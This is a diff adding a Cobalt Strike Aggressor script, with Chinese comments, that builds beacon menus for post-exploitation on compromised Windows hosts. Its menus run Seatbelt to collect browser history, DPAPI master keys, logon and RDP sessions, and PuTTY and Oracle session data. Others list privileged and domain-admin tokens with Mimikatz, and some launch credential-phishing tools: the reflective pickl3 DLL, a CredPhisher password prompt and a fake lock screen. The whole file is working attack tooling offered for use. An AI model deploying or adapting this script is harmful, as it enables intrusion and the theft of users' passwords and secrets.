@@ -1,0 +1,116 @@
+menu "Seatbelt"{
+    item "All In One"{
+	local ('$bid');
+		foreach $bid ($1){
+			seatbeltall($bid);
+		}
+	}
+    item "RDPSessions"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'RDPSessions');
+        }
+    }
+    #多选
+    item "谷歌|火狐浏览器记录"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'ChromiumHistory FirefoxHistory IEUrls ChromiumPresence');
+        }
+    }
+    item "GetMasterKeys"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'DpapiMasterKeys');
+        }
+    }
+    item "登录日志"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'LogonEvents');
+        }
+    }
+    item "登录Session"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'LogonSessions');
+        }
+    }
+    item "网络共享"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'NetworkShares');
+        }
+    }
+    item "OracleSQLDeveloper"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'OracleSQLDeveloper');
+        }
+    }
+    item "PuttySessions"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'PuttySessions');
+        }
+    }
+    item "TcpConnections"{
+        local ('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1,script_resource('/exe/Seatbelt.exe'),'TcpConnections');
+        }
+    }
+}
+
+#Mimikatz
+menu "Mimikatz"{
+    item "List Tokens"{
+	    local ('$bid');
+		foreach $bid ($1){
+			bmimikatz($1, "token::list");
+		}
+	}
+    item "List Admin Tokens"{
+        local ('$bid');
+		foreach $bid ($1){
+			bmimikatz($1, "token::list /admin");
+		}
+    }
+    item "Domain Admin Tokens"{
+        local ('$bid');
+		foreach $bid ($1){
+			bmimikatz($1, "token::list /domainadmin");
+		}
+    }
+}
+
+# 钓用户密码
+menu "Phishing User"{
+    item "pickl3"{
+        local('$bid');
+        foreach $bid ($1){
+            #dll反射加载
+            bdllspawn($1, script_resource("/exe/pickl3_reflective_dll_x64.dll"), $1, "pickl3", 5000, false);
+        }
+	}
+    item "credphisher"{
+        local('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Your Password"');
+        }
+    }
+    item "锁屏"{
+        local('$bid');
+        foreach $bid ($1){
+            bexecute_assembly($1, script_resource('/exe/locksreen.exe'));
+        }
+    }
+    
+}
+
+######################
+#子函数
+###############
+sub seatbeltall{
+bexecute_assembly($1, script_resource('/exe/Seatbelt.exe'), "-group=all -full");
+}
